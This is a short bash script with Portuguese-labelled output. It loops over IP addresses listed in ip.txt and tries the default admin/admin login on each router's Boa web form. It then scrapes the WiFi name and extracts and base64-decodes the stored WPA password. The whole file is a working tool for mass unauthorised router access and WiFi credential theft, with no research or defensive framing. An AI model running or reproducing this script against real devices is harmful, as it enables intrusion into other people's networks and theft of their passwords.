#!/bin/bash
filename='ip.txt'
n=1
while read line;
do
# reading each line
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
echo "Numero do IP:"
echo "$line"
echo " "
echo "301 é login com sucesso:"
curl  --connect-timeout 5 "http://$line/boaform/admin/formLogin" --data-raw "challenge=&username=admin&password=admin&save=Login&submit-url=%2Fadmin%2Flogin.asp&postSecurityFlag=12726" | grep "301" | cut -d ">" -f 4
echo " "
echo "Nome do Wifi:"
curl "http://$line/wlbasic.asp" | grep 'var ssid'
echo " "
echo "Senha decodificada:"
curl "http://$line/wlwpa.asp" | fgrep '_wpaPSK[0]=' | cut -d "'" -f 2 | base64 --decode
echo " "
echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
n=$((n+1))
done < $filename
